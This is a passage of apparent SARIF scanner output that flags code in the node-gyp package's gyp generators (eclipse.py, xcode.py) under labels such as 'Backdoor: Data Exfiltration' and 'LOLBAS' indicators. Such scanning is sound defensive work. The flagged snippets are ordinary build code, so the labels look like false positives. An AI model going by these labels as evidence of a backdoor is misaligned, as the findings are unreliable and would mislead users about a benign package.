                    "text": "    all_defines = {}\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n\n",
                    "rendered": {
                      "text": "    all_defines = {}\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n\n",
                      "markdown": "`    all_defines = {}\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 29,
                  "endLine": 194,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n",
                    "rendered": {
                      "text": "\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n",
                      "markdown": "`\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 48,
                  "endLine": 187,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  \"\"\"\n    # First, see if the compiler is configured in make's settings.\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_dict = data[build_file].get(\"make_global_settings\", {})\n    for key, value in make_global_settings_dict:\n        if key in [\"CC\", \"CXX\"]:\n            return os.path.join(options.toplevel_dir, value)\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # First, see if the compiler is configured in make's settings.\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_dict = data[build_file].get(\"make_global_settings\", {})\n    for key, value in make_global_settings_dict:\n        if key in [\"CC\", \"CXX\"]:\n            return os.path.join(options.toplevel_dir, value)\n",
                      "markdown": "`  \"\"\"\n    # First, see if the compiler is configured in make's settings.\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_dict = data[build_file].get(\"make_global_settings\", {})\n    for key, value in make_global_settings_dict:\n        if key in [\"CC\", \"CXX\"]:\n            return os.path.join(options.toplevel_dir, value)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 32,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        if config_name in target[\"configurations\"]:\n",
                    "rendered": {
                      "text": "\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        if config_name in target[\"configurations\"]:\n",
                      "markdown": "`\n    flavor = gyp.common.GetFlavor(params)\n    if flavor == \"win\":\n        generator_flags = params.get(\"generator_flags\", {})\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        if config_name in target[\"configurations\"]:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 22,
                  "endLine": 73,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n",
                    "rendered": {
                      "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n",
                      "markdown": "`    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 28,
                  "endLine": 72,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n",
                    "rendered": {
                      "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n",
                      "markdown": "`def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 28,
                  "endLine": 60,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    flavor = gyp.common.GetFlavor(params)\n",
                    "rendered": {
                      "text": "\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    flavor = gyp.common.GetFlavor(params)\n",
                      "markdown": "`\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    flavor = gyp.common.GetFlavor(params)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 22,
                  "endLine": 194,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n",
                    "rendered": {
                      "text": "\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n",
                      "markdown": "`\n    # Check to see if the compiler was specified as an environment variable.\n    for key in [\"CC_target\", \"CC\", \"CXX\"]:\n        compiler = os.environ.get(key)\n        if compiler:\n            return compiler\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1084,
                  "startColumn": 62,
                  "endLine": 1084,
                  "endColumn": 66,
                  "snippet": {
                    "text": "                makefile = open(makefile_path, \"w\")\n\n                # make will build the first target in the makefile by default.  By\n                # convention, it's called \"all\".  List all (or at least one)\n                # concrete output for each rule source as a prerequisite of the \"all\"\n                # target.\n                makefile.write(\"all: \\\\\\n\")\n",
                    "rendered": {
                      "text": "                makefile = open(makefile_path, \"w\")\n\n                # make will build the first target in the makefile by default.  By\n                # convention, it's called \"all\".  List all (or at least one)\n                # concrete output for each rule source as a prerequisite of the \"all\"\n                # target.\n                makefile.write(\"all: \\\\\\n\")\n",
                      "markdown": "`                makefile = open(makefile_path, \"w\")\n\n                # make will build the first target in the makefile by default.  By\n                # convention, it's called \"all\".  List all (or at least one)\n                # concrete output for each rule source as a prerequisite of the \"all\"\n                # target.\n                makefile.write(\"all: \\\\\\n\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1043,
                  "startColumn": 48,
                  "endLine": 1043,
                  "endColumn": 52,
                  "snippet": {
                    "text": "                )\n                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n",
                    "rendered": {
                      "text": "                )\n                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n",
                      "markdown": "`                )\n                concrete_outputs_all.extend(concrete_outputs_for_this_rule_source)\n\n                # TODO(mark): Should verify that at most one of these is specified.\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    for output in concrete_outputs_for_this_rule_source:\n                        AddSourceToTarget(output, type, pbxp, xct)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 991,
                  "startColumn": 63,
                  "endLine": 991,
                  "endColumn": 67,
                  "snippet": {
                    "text": "            # corresponding rule_source or to any specified additional input, the\n            # rule action must be performed to generate the concrete outputs.\n\n            # concrete_outputs_by_rule_source will have an item at the same index\n            # as the rule['rule_sources'] that it corresponds to.  Each item is a\n            # list of all of the concrete outputs for the rule_source.\n            concrete_outputs_by_rule_source = []\n",
                    "rendered": {
                      "text": "            # corresponding rule_source or to any specified additional input, the\n            # rule action must be performed to generate the concrete outputs.\n\n            # concrete_outputs_by_rule_source will have an item at the same index\n            # as the rule['rule_sources'] that it corresponds to.  Each item is a\n            # list of all of the concrete outputs for the rule_source.\n            concrete_outputs_by_rule_source = []\n",
                      "markdown": "`            # corresponding rule_source or to any specified additional input, the\n            # rule action must be performed to generate the concrete outputs.\n\n            # concrete_outputs_by_rule_source will have an item at the same index\n            # as the rule['rule_sources'] that it corresponds to.  Each item is a\n            # list of all of the concrete outputs for the rule_source.\n            concrete_outputs_by_rule_source = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 914,
                  "startColumn": 44,
                  "endLine": 914,
                  "endColumn": 48,
                  "snippet": {
                    "text": "                xct._properties[\"buildPhases\"].insert(prebuild_index, ssbp)\n                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n",
                    "rendered": {
                      "text": "                xct._properties[\"buildPhases\"].insert(prebuild_index, ssbp)\n                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n",
                      "markdown": "`                xct._properties[\"buildPhases\"].insert(prebuild_index, ssbp)\n                prebuild_index = prebuild_index + 1\n\n            # TODO(mark): Should verify that at most one of these is specified.\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                for output in action[\"outputs\"]:\n                    AddSourceToTarget(output, type, pbxp, xct)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 868,
                  "startColumn": 71,
                  "endLine": 868,
                  "endColumn": 75,
                  "snippet": {
                    "text": "        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n",
                    "rendered": {
                      "text": "        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n",
                      "markdown": "`        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n            # Do we have a message to print when this action runs?\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 567,
                  "startColumn": 42,
                  "endLine": 567,
                  "endColumn": 50,
                  "snippet": {
                    "text": "def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n",
                    "rendered": {
                      "text": "def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n",
                      "markdown": "`def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 9,
                  "endLine": 437,
                  "endColumn": 17,
                  "snippet": {
                    "text": "                            idx + 1, run_all_target\n                        )\n\n        # Update all references to other projects, to make sure that the lists of\n        # remote products are complete.  Otherwise, Xcode will fill them in when\n        # it opens the project file, which will result in unnecessary diffs.\n        # TODO(mark): This is evil because it relies on internal knowledge of\n",
                    "rendered": {
                      "text": "                            idx + 1, run_all_target\n                        )\n\n        # Update all references to other projects, to make sure that the lists of\n        # remote products are complete.  Otherwise, Xcode will fill them in when\n        # it opens the project file, which will result in unnecessary diffs.\n        # TODO(mark): This is evil because it relies on internal knowledge of\n",
                      "markdown": "`                            idx + 1, run_all_target\n                        )\n\n        # Update all references to other projects, to make sure that the lists of\n        # remote products are complete.  Otherwise, Xcode will fill them in when\n        # it opens the project file, which will result in unnecessary diffs.\n        # TODO(mark): This is evil because it relies on internal knowledge of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 392,
                  "startColumn": 74,
                  "endLine": 393,
                  "snippet": {
                    "text": "        # Finalize2 needs to happen in a separate step because the process of\n        # updating references to other projects depends on the ordering of targets\n        # within remote project files.  Finalize1 is responsible for sorting duty,\n        # and once all project files are sorted, Finalize2 can come in and update\n        # these references.\n\n        # To support making a \"test runner\" target that will run all the tests\n        # that are direct dependents of any given target, we look for\n",
                    "rendered": {
                      "text": "        # Finalize2 needs to happen in a separate step because the process of\n        # updating references to other projects depends on the ordering of targets\n        # within remote project files.  Finalize1 is responsible for sorting duty,\n        # and once all project files are sorted, Finalize2 can come in and update\n        # these references.\n\n        # To support making a \"test runner\" target that will run all the tests\n        # that are direct dependents of any given target, we look for\n",
                      "markdown": "`        # Finalize2 needs to happen in a separate step because the process of\n        # updating references to other projects depends on the ordering of targets\n        # within remote project files.  Finalize1 is responsible for sorting duty,\n        # and once all project files are sorted, Finalize2 can come in and update\n        # these references.\n\n        # To support making a \"test runner\" target that will run all the tests\n        # that are direct dependents of any given target, we look for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 310,
                  "startColumn": 41,
                  "endLine": 310,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n                    command_prefix = \"\"\"python -c \"import fcntl, subprocess, sys\n",
                    "rendered": {
                      "text": "                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n                    command_prefix = \"\"\"python -c \"import fcntl, subprocess, sys\n",
                      "markdown": "`                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n                # make sure only one runs at a time.\n                command_prefix = \"\"\n                if serialize_all_tests:\n                    command_prefix = \"\"\"python -c \"import fcntl, subprocess, sys\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 306,
                  "startColumn": 53,
                  "endLine": 306,
                  "endColumn": 57,
                  "snippet": {
                    "text": "                    )\n\n                # Some test end up using sockets, files on disk, etc. and can get\n                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n",
                    "rendered": {
                      "text": "                    )\n\n                # Some test end up using sockets, files on disk, etc. and can get\n                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n",
                      "markdown": "`                    )\n\n                # Some test end up using sockets, files on disk, etc. and can get\n                # confused if more then one test runs at a time.  The generator\n                # flag 'xcode_serialize_all_test_runs' controls the forcing of all\n                # tests serially.  It defaults to True.  To get serial runs this\n                # little bit of python does the same as the linux flock utility to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1343,
                  "startColumn": 19,
                  "endLine": 1343,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            for library in spec[\"libraries\"]:\n                xct.FrameworksPhase().AddFile(library)\n                # Add the library's directory to LIBRARY_SEARCH_PATHS if necessary.\n                # I wish Xcode handled this automatically.\n                library_dir = posixpath.dirname(library)\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xct.HasBuildSetting(_library_search_paths_var)\n",
                    "rendered": {
                      "text": "            for library in spec[\"libraries\"]:\n                xct.FrameworksPhase().AddFile(library)\n                # Add the library's directory to LIBRARY_SEARCH_PATHS if necessary.\n                # I wish Xcode handled this automatically.\n                library_dir = posixpath.dirname(library)\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xct.HasBuildSetting(_library_search_paths_var)\n",
                      "markdown": "`            for library in spec[\"libraries\"]:\n                xct.FrameworksPhase().AddFile(library)\n                # Add the library's directory to LIBRARY_SEARCH_PATHS if necessary.\n                # I wish Xcode handled this automatically.\n                library_dir = posixpath.dirname(library)\n                if library_dir not in xcode_standard_library_dirs and (\n                    not xct.HasBuildSetting(_library_search_paths_var)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1308,
                  "startColumn": 42,
                  "endLine": 1308,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n",
                    "rendered": {
                      "text": "            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n",
                      "markdown": "`            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1306,
                  "startColumn": 44,
                  "endLine": 1306,
                  "endColumn": 52,
                  "snippet": {
                    "text": "            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n",
                    "rendered": {
